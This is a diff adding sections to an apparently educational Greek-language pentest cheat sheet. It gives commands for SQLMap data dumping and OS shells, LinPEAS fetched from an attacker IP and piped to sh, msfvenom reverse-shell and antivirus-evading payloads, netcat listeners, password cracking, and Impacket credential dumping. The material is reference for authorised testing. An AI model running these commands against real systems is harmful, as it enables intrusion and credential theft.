@@ -314,6 +314,473 @@
         </div>
 
         <!-- Export -->
+        <!-- Export -->
         <div class="card">
             <div class="card-header">
                 <div class="card-title">Αποθήκευση Αποτελεσμάτων</div>
+                <span class="category-tag tag-nikto">Export</span>
+            </div>
+            <div class="card-desc">Αποθηκεύει τα ευρήματα της σάρωσης σε αρχείο (HTML, txt, xml). Η μορφή HTML προτιμάται για εύκολη και καθαρή ανάγνωση των αποτελεσμάτων.</div>
+            <div class="code-block">nikto -h http://<span>[TARGET_IP]</span> -o report.html -Format htm</div>
+        </div>
+    </div>
+</section>
+
+                
+
+                <!-- ==================== SECTION: SQLMAP ==================== -->
+        <section id="sqlmap">
+            <h3 class="tool-title sqlmap-title">🗄️ 6. SQLMap</h3>
+            
+            <div class="info-box sqlmap-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Το SQLMap είναι ένα αυτοματοποιημένο εργαλείο που χρησιμοποιείται <strong>μόλις εντοπιστεί πιθανό documentation ή παράμετρος εισόδου ευπαθής σε SQL Injection</strong> (π.χ. `?id=1`). Χρησιμοποιείται για την επιβεβαίωση της ευπάθειας, την εξαγωγή δεδομένων από τη βάση (data dumping), την ανάγνωση αρχείων του συστήματος, ή ακόμα και την απόκτηση απομακρυσμένου κελύφους (OS shell).</p>
+            </div>
+
+            <div class="commands-grid">
+                <!-- Simple GET -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Έλεγχος Παραμέτρου GET</div>
+                        <span class="category-tag tag-sqlmap">GET Request</span>
+                    </div>
+                    <div class="card-desc">Ελέγχει αν μια συγκεκριμένη παράμετρος URL είναι ευπαθής και αναγνωρίζει το είδος της βάσης δεδομένων.</div>
+                    <div class="code-block">sqlmap -u "http://<span>[TARGET_IP]</span>/page.php?id=1" --batch</div>
+                </div>
+
+                <!-- POST Request via file -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Έλεγχος POST Request (μέσω Αρχείου)</div>
+                        <span class="category-tag tag-sqlmap">POST Request</span>
+                    </div>
+                    <div class="card-desc">Ελέγχει φόρμες (π.χ. Login) χρησιμοποιώντας ένα αποθηκευμένο HTTP request αρχείο από το Burp Suite.</div>
+                    <div class="code-block">sqlmap -r request.txt --batch</div>
+                </div>
+
+                <!-- Banner & DB Enumeration -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Απαρίθμηση Βάσεων Δεδομένων</div>
+                        <span class="category-tag tag-sqlmap">Enumeration</span>
+                    </div>
+                    <div class="card-desc">Εξάγει την έκδοση (banner), το τρέχον όνομα χρήστη και όλες τις διαθέσιμες βάσεις δεδομένων του server.</div>
+                    <div class="code-block">sqlmap -u "http://<span>[TARGET_IP]</span>/page.php?id=1" --banner --current-user --dbs --batch</div>
+                </div>
+
+                <!-- Data Dumping -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Εξαγωγή Δεδομένων (Dump) Πίνακα</div>
+                        <span class="category-tag tag-sqlmap">Data Dump</span>
+                    </div>
+                    <div class="card-desc">Εξάγει όλα τα περιεχόμενα ενός συγκεκριμένου πίνακα από μια συγκεκριμένη βάση δεδομένων (ιδανικό για credentials).</div>
+                    <div class="code-block">sqlmap -u "http://<span>[TARGET_IP]</span>/page.php?id=1" -D <span>[DB_NAME]</span> -T <span>[TABLE_NAME]</span> --dump --batch</div>
+                </div>
+
+                <!-- OS Shell -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Απομακρυσμένο OS Shell</div>
+                        <span class="category-tag tag-sqlmap">Exploitation</span>
+                    </div>
+                    <div class="card-desc">Προσπαθεί να αποκτήσει ένα interactive terminal (shell) στο λειτουργικό σύστημα του server αν τα προνόμια της DB το επιτρέπουν.</div>
+                    <div class="code-block">sqlmap -u "http://<span>[TARGET_IP]</span>/page.php?id=1" --os-shell --batch</div>
+                </div>
+            </div>
+        </section>
+<!-- ==================== SECTION: LINPEAS ==================== -->
+        <section id="linpeas">
+            <h3 class="tool-title linpeas-title">🐧 7. LinPEAS</h3>
+            
+            <div class="info-box linpeas-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Το LinPEAS επιστρατεύεται <strong>αμέσως μόλις αποκτήσεις πρόσβαση χαμηλού επιπέδου (initial foothold) σε ένα Linux σύστημα</strong>. Είναι ένα αυτοματοποιημένο script που σαρώνει το σύστημα για πιθανές αδυναμίες, λάθος ρυθμίσεις (misconfigurations), ευπαθείς εκδόσεις πυρήνα (kernel exploits), SUID αρχεία ή κωδικούς σε plain text, με σκοπό την ανύψωση προνομίων σε Root.</p>
+            </div>
+
+            <div class="commands-grid">
+                <!-- Memory Execution -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Απευθείας Εκτέλεση στη Μνήμη (Χωρίς Αποθήκευση)</div>
+                        <span class="category-tag tag-linpeas">In-Memory</span>
+                    </div>
+                    <div class="card-desc">Κατεβάζει το script από τον τοπικό σου server και το εκτελεί απευθείας στη μνήμη του στόχου μέσω pipe, αποφεύγοντας τα ίχνη στον δίσκο.</div>
+                    <div class="code-block">curl -s http://<span>[YOUR_IP]</span>/linpeas.sh | sh</div>
+                </div>
+
+                <!-- Local Run & Logging -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Τοπική Εκτέλεση & Αποθήκευση σε Log</div>
+                        <span class="category-tag tag-linpeas">Local Run</span>
+                    </div>
+                    <div class="card-desc">Εκτελεί το script τοπικά (αν το έχεις ήδη μεταφέρει) και αποθηκεύει τα έγχρωμα αποτελέσματα σε αρχείο κειμένου για μετέπειτα ανάλυση.</div>
+                    <div class="code-block">./linpeas.sh -a &gt; linpeas.log</div>
+                </div>
+
+                <!-- Reading Log with Colors -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Ανάγνωση του Log με Διατήρηση Χρωμάτων</div>
+                        <span class="category-tag tag-linpeas">Analysis</span>
+                    </div>
+                    <div class="card-desc">Επειδή τα χρώματα του LinPEAS δείχνουν την κρισιμότητα (π.χ. το κόκκινο/κίτρινο είναι 99% Privilege Escalation vector), το διαβάζεις με την 'less' για να μην χαθούν.</div>
+                    <div class="code-block">less -r linpeas.log</div>
+                </div>
+
+                <!-- Network Transfer (NC) -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Μεταφορά μέσω Netcat (Όταν δεν υπάρχει Curl/Wget)</div>
+                        <span class="category-tag tag-linpeas">Transfer</span>
+                    </div>
+                    <div class="card-desc">Στέλνει το script στον στόχο χρησιμοποιώντας netcat, σε περίπτωση που ο στόχος δεν έχει πρόσβαση στο διαδίκτυο ή δεν διαθέτει curl.</div>
+                    <div class="code-block">nc -w 3 <span>[TARGET_IP]</span> 1234 &lt; linpeas.sh</div>
+                </div>
+            </div>
+        </section>
+        <!-- ==================== SECTION: JOHN ==================== -->
+        <section id="john">
+            <h3 class="tool-title john-title">🔨 8. John the Ripper</h3>
+            
+            <div class="info-box john-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Το John the Ripper χρησιμοποιείται <strong>όταν έχεις αποκτήσει κρυπτογραφημένους κωδικούς (hashes)</strong> από βάσεις δεδομένων, αρχεία συστήματος (όπως το /etc/shadow) ή προστατευμένα αρχεία (zip, pdf, ssh keys). Χρησιμοποιείται για να σπάσει (crack) αυτούς τους κωδικούς μέσω επιθέσεων brute-force ή χρησιμοποιώντας λίστες λέξεων (wordlists).</p>
+            </div>
+
+            <div class="commands-grid">
+                <!-- Standard Wordlist Crack -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Σπάσιμο με Λίστα Λέξεων (Wordlist)</div>
+                        <span class="category-tag tag-john">Wordlist</span>
+                    </div>
+                    <div class="card-desc">Η πιο κλασική επίθεση. Δοκιμάζει τις λέξεις από μια λίστα (π.χ. rockyou.txt) πάνω στο αρχείο με τα hashes.</div>
+                    <div class="code-block">john --wordlist=/usr/share/wordlists/rockyou.txt <span>hashes.txt</span></div>
+                </div>
+
+                <!-- Format Specification -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Ορισμός Συγκεκριμένου Format</div>
+                        <span class="category-tag tag-john">Format</span>
+                    </div>
+                    <div class="card-desc">Επιταχύνει τη διαδικασία ορίζοντας χειροκίνητα τον τύπο του hash (π.χ. md5, sha256, ntlm) αν τον γνωρίζεις ήδη.</div>
+                    <div class="code-block">john --format=<span>[FORMAT]</span> --wordlist=rockyou.txt hashes.txt</div>
+                </div>
+
+                <!-- SSH Key Cracking -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Σπάσιμο Κλειδιού SSH (id_rsa)</div>
+                        <span class="category-tag tag-john">SSH Key</span>
+                    </div>
+                    <div class="card-desc">Μετατρέπει πρώτα το ιδιωτικό κλειδί SSH σε μορφή που καταλαβαίνει ο John και μετά σπάει το passphrase.</div>
+                    <div class="code-block">ssh2john id_rsa &gt; ssh.hash && john --wordlist=rockyou.txt ssh.hash</div>
+                </div>
+
+                <!-- Zip/RAR Cracking -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Σπάσιμο Κλειδωμένου Αρχείου ZIP</div>
+                        <span class="category-tag tag-john">Archives</span>
+                    </div>
+                    <div class="card-desc">Εξάγει το hash από ένα προστατευμένο αρχείο ZIP και ξεκινάει την επίθεση για την εύρεση του κωδικού.</div>
+                    <div class="code-block">zip2john secret.zip &gt; zip.hash && john --wordlist=rockyou.txt zip.hash</div>
+                </div>
+
+                <!-- Show Results -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Προβολή Σπασμένων Κωδικών</div>
+                        <span class="category-tag tag-john">Results</span>
+                    </div>
+                    <div class="card-desc">Εμφανίζει στην οθόνη τους κωδικούς που κατάφερε να σπάσει ο John από το συγκεκριμένο αρχείο.</div>
+                    <div class="code-block">john --show <span>hashes.txt</span></div>
+                </div>
+            </div>
+        </section>
+<!-- ==================== SECTION: MSFVENOM ==================== -->
+        <section id="msfvenom">
+            <h3 class="tool-title msfvenom-title">🐙 9. Msfvenom</h3>
+            
+            <div class="info-box msfvenom-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Το Msfvenom επιστρατεύεται <strong>όταν χρειάζεται να δημιουργήσεις ένα κακόβουλο αρχείο (payload / reverse shell)</strong> για να αποκτήσεις πρόσβαση στο σύστημα του στόχου. Συνδυάζει τις δυνατότητες δημιουργίας payloads και κωδικοποίησης (encoding) του Metasploit Framework, επιτρέποντάς σου να παράγεις εκτελέσιμα αρχεία για Windows, Linux, Android, ή scripts για Web Servers (PHP, ASPX, JSP).</p>
+            </div>
+
+            <div class="commands-grid">
+                <!-- Windows Reverse Shell -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Windows Reverse Shell (.exe)</div>
+                        <span class="category-tag tag-msfvenom">Windows</span>
+                    </div>
+                    <div class="card-desc">Δημιουργεί ένα εκτελέσιμο αρχείο για Windows το οποίο, μόλις τρέξει, συνδέεται πίσω στο μηχάνημά σου.</div>
+                    <div class="code-block">msfvenom -p windows/shell_reverse_tcp LHOST=<span>[YOUR_IP]</span> LPORT=<span>[YOUR_PORT]</span> -f exe -o shell.exe</div>
+                </div>
+
+                <!-- Linux Reverse Shell -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Linux Reverse Shell (.elf)</div>
+                        <span class="category-tag tag-msfvenom">Linux</span>
+                    </div>
+                    <div class="card-desc">Παράγει ένα εκτελέσιμο αρχείο ELF για συστήματα Linux, κατάλληλο για upload και εκτέλεση μέσω command injection.</div>
+                    <div class="code-block">msfvenom -p linux/x64/shell_reverse_tcp LHOST=<span>[YOUR_IP]</span> LPORT=<span>[YOUR_PORT]</span> -f elf -o shell.elf</div>
+                </div>
+
+                <!-- PHP Web Shell -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">PHP Reverse Shell (Web Malicious Script)</div>
+                        <span class="category-tag tag-msfvenom">Web PHP</span>
+                    </div>
+                    <div class="card-desc">Δημιουργεί ένα αρχείο PHP. Ιδανικό για περιπτώσεις όπου μπορείς να ανεβάσεις αρχεία (File Upload Vulnerability) σε έναν Web Server.</div>
+                    <div class="code-block">msfvenom -p php/reverse_php LHOST=<span>[YOUR_IP]</span> LPORT=<span>[YOUR_PORT]</span> -f raw -o shell.php</div>
+                </div>
+
+                <!-- Windows Meterpreter with Encoding -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Windows Meterpreter & Evasion (Shikata_ga_nai)</div>
+                        <span class="category-tag tag-msfvenom">Advanced</span>
+                    </div>
+                    <div class="card-desc">Παράγει ένα προηγμένο interactive shell (Meterpreter) και το κωδικοποιεί 5 φορές για την αποφυγή απλών συστημάτων Antivirus.</div>
+                    <div class="code-block">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span>[YOUR_IP]</span> LPORT=<span>[YOUR_PORT]</span> -e x86/shikata_ga_nai -i 5 -f exe -o met.exe</div>
+                </div>
+            </div>
+        </section>
+<!-- ==================== SECTION: NETCAT ==================== -->
+        <section id="netcat">
+            <h3 class="tool-title netcat-title">🔌 10. Netcat</h3>
+            
+            <div class="info-box netcat-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Το Netcat είναι ο "ελβετικός σουγιάς" των δικτύων. Χρησιμοποιείται <strong>σχεδόν σε κάθε φάση μιας δοκιμής διείσδυσης</strong>, κυρίως για τη δημιουργία listeners που υποδέχονται Reverse Shells, για τη χειροκίνητη αποστολή δεδομένων σε θύρες, για βασικό Port Scanning, αλλά και για τη γρήγορη μεταφορά αρχείων μεταξύ μηχανημάτων.</p>
+            </div>
+
+            <div class="commands-grid">
+                <!-- Reverse Shell Listener -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Δημιουργία Listener (Reverse Shell)</div>
+                        <span class="category-tag tag-netcat">Listener</span>
+                    </div>
+                    <div class="card-desc">Ανοίγει μια θύρα στο μηχάνημά σου και περιμένει να συνδεθεί το payload ή το reverse shell από τον στόχο.</div>
+                    <div class="code-block">nc -lvnp <span>[YOUR_PORT]</span></div>
+                </div>
+
+                <!-- Bind Shell Connection -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Σύνδεση σε Bind Shell / Port</div>
+                        <span class="category-tag tag-netcat">Connect</span>
+                    </div>
+                    <div class="card-desc">Συνδέεται απευθείας σε μια συγκεκριμένη ανοιχτή θύρα του στόχου (ή σε ένα Bind Shell που τρέχει ήδη εκεί).</div>
+                    <div class="code-block">nc -nv <span>[TARGET_IP]</span> <span>[TARGET_PORT]</span></div>
+                </div>
+
+                <!-- File Transfer - Receive -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Λήψη Αρχείου (Στον Στόχο)</div>
+                        <span class="category-tag tag-netcat">Transfer</span>
+                    </div>
+                    <div class="card-desc">Ανοίγει μια θύρα στον στόχο και αποθηκεύει ό,τι δεδομένα λάβει απευθείας σε ένα τοπικό αρχείο.</div>
+                    <div class="code-block">nc -lvnp <span>[PORT]</span> &gt; <span>output_file.txt</span></div>
+                </div>
+
+                <!-- File Transfer - Send -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Αποστολή Αρχείου (Από το Επιτιθέμενο)</div>
+                        <span class="category-tag tag-netcat">Transfer</span>
+                    </div>
+                    <div class="card-desc">Στέλνει ένα αρχείο από το μηχάνημά σου προς τον listener που έχει στηθεί προηγουμένως στον στόχο.</div>
+                    <div class="code-block">nc -nv <span>[TARGET_IP]</span> <span>[PORT]</span> &lt; <span>file_to_send.txt</span></div>
+                </div>
+
+                <!-- Banner Grabbing -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Banner Grabbing (Αναγνώριση Υπηρεσίας)</div>
+                        <span class="category-tag tag-netcat">Enumeration</span>
+                    </div>
+                    <div class="card-desc">Συνδέεται στη θύρα μιας υπηρεσίας για να τραβήξει το banner (έκδοση λογισμικού) χωρίς να ξεκινήσει πλήρη σάρωση.</div>
+                    <div class="code-block">echo "" | nc -nv -w 2 <span>[TARGET_IP]</span> <span>[PORT]</span></div>
+                </div>
+            </div>
+        </section>
+<!-- ==================== SECTION: BURPSUITE ==================== -->
+        <section id="burpsuite">
+            <h3 class="tool-title burpsuite-title">🦊 11. Burp Suite</h3>
+            
+            <div class="info-box burpsuite-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Το Burp Suite επιστρατεύεται <strong>κατά την αξιολόγηση και τον έλεγχο Web εφαρμογών</strong>. Λειτουργεί ως ενδιάμεσος (Interception Proxy) ανάμεσα στον browser σου και τον server. Σου επιτρέπει να βλέπεις, να τροποποιείς (Proxy/Repeater) και να αυτοματοποιείς επιθέσεις (Intruder) σε HTTP/HTTPS requests και responses σε πραγματικό χρόνο.</p>
+            </div>
+
+            <div class="commands-grid">
+                <!-- Intercept Traffic -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Καταγραφή & Τροποποίηση Κίνησης (Proxy)</div>
+                        <span class="category-tag tag-burp">Proxy</span>
+                    </div>
+                    <div class="card-desc">Παρακρατεί τα HTTP requests στον Proxy. Σου επιτρέπει να αλλάξεις παραμέτρους (π.χ. cookies, input fields) πριν αυτά φτάσουν στον server.</div>
+                    <div class="code-block">Proxy tab -&gt; Intercept is ON -&gt; [Modify Request] -&gt; Forward</div>
+                </div>
+
+                <!-- Repeater -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Επαναλαμβανόμενες Δοκιμές (Repeater)</div>
+                        <span class="category-tag tag-burp">Repeater</span>
+                    </div>
+                    <div class="card-desc">Στέλνει ένα συγκεκριμένο request ξανά και ξανά με χειροκίνητες αλλαγές. Ιδανικό για δοκιμές Command Injection, XSS και SQLi.</div>
+                    <div class="code-block">Right-Click on Request -&gt; Send to Repeater (Ctrl+R)</div>
+                </div>
+
+                <!-- Intruder - Fuzzing -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Αυτοματοποιημένο Fuzzing & Brute Force (Intruder)</div>
+                        <span class="category-tag tag-burp">Intruder</span>
+                    </div>
+                    <div class="card-desc">Ρίχνει λίστες λέξεων σε συγκεκριμένα πεδία (π.χ. username/password) χρησιμοποιώντας διαφορετικά attack types (Sniper, Pitchfork).</div>
+                    <div class="code-block">Right-Click on Request -&gt; Send to Intruder (Ctrl+I)</div>
+                </div>
+
+                <!-- Match and Replace -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Αυτόματη Αντικατάσταση (Match & Replace)</div>
+                        <span class="category-tag tag-burp">Automation</span>
+                    </div>
+                    <div class="card-desc">Τροποποιεί αυτόματα headers ή δεδομένα σε κάθε request. Πολύ χρήσιμο για την παράκαμψη ελέγχων ταυτοποίησης (Privilege Escalation).</div>
+                    <div class="code-block">Proxy Settings -&gt; Match and Replace Rules -&gt; Add Rule</div>
+                </div>
+            </div>
+        </section>
+<!-- ==================== SECTION: WIRESHARK ==================== -->
+        <section id="wireshark">
+            <h3 class="tool-title wireshark-title">🦈 12. Wireshark</h3>
+            
+            <div class="info-box wireshark-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Το Wireshark επιστρατεύεται για την <strong>ανάλυση της κίνησης του δικτύου (Packet Analysis)</strong> σε πραγματικό χρόνο ή μέσω αποθηκευμένων αρχείων καταγραφής (.pcap). Χρησιμοποιείται για την αποσφαλμάτωση δικτύων, την εύρεση ευαίσθητων δεδομένων που μεταφέρονται χωρίς κρυπτογράφηση (όπως plain text κωδικοί σε HTTP, FTP, Telnet) και την αναγνώριση ύποπτης δραστηριότητας.</p>
+            </div>
+
+            <div class="commands-grid">
+                <!-- Capture Traffic -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Ζωντανή Καταγραφή Πακέτων</div>
+                        <span class="category-tag tag-wire">Capture</span>
+                    </div>
+                    <div class="card-desc">Επιλέγεις την κατάλληλη κάρτα δικτύου (π.χ. eth0, wlan0, tun0 για VPN) και ξεκινάς την καταγραφή της κίνησης.</div>
+                    <div class="code-block">Double-click on Interface (e.g., eth0) -> Click Blue Shark Fin to Start</div>
+                </div>
+
+                <!-- Basic Filters -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Φιλτράρισμα με βάση IP & Θύρα</div>
+                        <span class="category-tag tag-wire">Filters</span>
+                    </div>
+                    <div class="card-desc">Απομονώνει την κίνηση που αφορά μια συγκεκριμένη διεύθυνση IP ή μια συγκεκριμένη θύρα, μειώνοντας τον θόρυβο.</div>
+                    <div class="code-block">ip.addr == <span>[TARGET_IP]</span> && tcp.port == 80</div>
+                </div>
+
+                <!-- Follow TCP Stream -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Παρακολούθηση Ροής (Follow TCP Stream)</div>
+                        <span class="category-tag tag-wire">Streams</span>
+                    </div>
+                    <div class="card-desc">Αναδομεί ολόκληρη τη συνομιλία μεταξύ δύο συσκευών, επιτρέποντάς σου να διαβάσεις τα δεδομένα σαν ενιαίο κείμενο.</div>
+                    <div class="code-block">Right-Click on Packet -> Follow -> TCP Stream</div>
+                </div>
+
+                <!-- Export HTTP Objects -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Εξαγωγή Αρχείων από το Δίκτυο</div>
+                        <span class="category-tag tag-wire">Export</span>
+                    </div>
+                    <div class="card-desc">Εντοπίζει και αποθηκεύει τοπικά αρχεία (εικόνες, εκτελέσιμα, έγγραφα) που μεταφέρθηκαν μέσω του μη κρυπτογραφημένου πρωτοκόλλου HTTP.</div>
+                    <div class="code-block">File -> Export Objects -> HTTP... -> Select File -> Save</div>
+                </div>
+            </div>
+        </section>
+<!-- ==================== SECTION: IMPACKET ==================== -->
+        <section id="impacket">
+            <h3 class="tool-title impacket-title">🛡️ 13. Impacket</h3>
+            
+            <div class="info-box impacket-box">
+                <h4>🤔 Πότε και γιατί το χρησιμοποιώ;</h4>
+                <p>Το Impacket είναι μια συλλογή από Python scripts που χρησιμοποιούνται <strong>κατά τη δοκιμή διείσδυσης σε περιβάλλοντα Windows και Active Directory (AD)</strong>. Είναι απαραίτητο για την αλληλεπίδραση με πρωτόκολλα δικτύου των Windows (SMB, MSRPC, NTLM, Kerberos), επιτρέποντάς σου να εκτελείς απομακρυσμένες εντολές, να εξάγεις credentials (secrets dumping) και να πραγματοποιείς επιθέσεις authentication.</p>
+            </div>
+
+            <div class="commands-grid">
+                <!-- Impacket-psexec -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Απομακρυσμένο Shell μέσω SMB (psexec)</div>
+                        <span class="category-tag tag-impacket">Exploitation</span>
+                    </div>
+                    <div class="card-desc">Αποκτά ένα interactive shell με δικαιώματα SYSTEM χρησιμοποιώντας έγκυρα credentials (ή NTLM hash) ενός Administrator.</div>
+                    <div class="code-block">impacket-psexec <span>[DOMAIN]</span>/<span>[USER]</span>:<span>[PASSWORD]</span>@<span>[TARGET_IP]</span></div>
+                </div>
+
+                <!-- Impacket-wmiexec -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Stealthy Remote Execution (wmiexec)</div>
+                        <span class="category-tag tag-impacket">Execution</span>
+                    </div>
+                    <div class="card-desc">Παρόμοιο με το psexec, αλλά εκτελεί εντολές μέσω WMI. Είναι πολύ πιο "ήσυχο" (stealthy) και αποφεύγει τον εντοπισμό από πολλά Antivirus.</div>
+                    <div class="code-block">impacket-wmiexec <span>[DOMAIN]</span>/<span>[USER]</span>:<span>[PASSWORD]</span>@<span>[TARGET_IP]</span></div>
+                </div>
+
+                <!-- Impacket-secretsdump -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Εξαγωγή Hashes / Credentials (secretsdump)</div>
+                        <span class="category-tag tag-impacket">Credentials</span>
+                    </div>
+                    <div class="card-desc">Εξάγει απομακρυσμένα τα SAM και LSA μυστικά, καθώς και ολόκληρη τη βάση δεδομένων NTDS.dit αν πρόκειται για Domain Controller.</div>
+                    <div class="code-block">impacket-secretsdump <span>[DOMAIN]</span>/<span>[USER]</span>:<span>[PASSWORD]</span>@<span>[TARGET_IP]</span></div>
+                </div>
+
+                <!-- Impacket-GetNPUsers (AS-REP Roasting) -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Active Directory AS-REP Roasting (GetNPUsers)</div>
+                        <span class="category-tag tag-impacket">AD Attack</span>
+                    </div>
+                    <div class="card-desc">Αναζητά χρήστες στο AD που δεν απαιτούν Kerberos προ-αυθεντικοποίηση και επιστρέφει hashes έτοιμα για σπάσιμο στον John/Hashcat.</div>
+                    <div class="code-block">impacket-GetNPUsers <span>[DOMAIN]</span>/ -usersfile users.txt -format john -dc-ip <span>[DC_IP]</span></div>
+                </div>
+
+                <!-- Impacket-smbserver -->
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">Στήσιμο Τοπικού SMB Server για Μεταφορά Αρχείων</div>
+                        <span class="category-tag tag-impacket">File Transfer</span>
+                    </div>
+                    <div class="card-desc">Δημιουργεί έναν κοινόχρηστο φάκελο SMB στο Linux σου, επιτρέποντας στο Windows θύμα να κατεβάσει αρχεία ή να σου στείλει δεδομένα.</div>
+                    <div class="code-block">impacket-smbserver <span>[SHARE_NAME]</span> $(pwd) -smb2support</div>
+                </div>
+            </div>
+        </section>
+
+
+
+
+
+        </main>
+    </body>
+        </html>
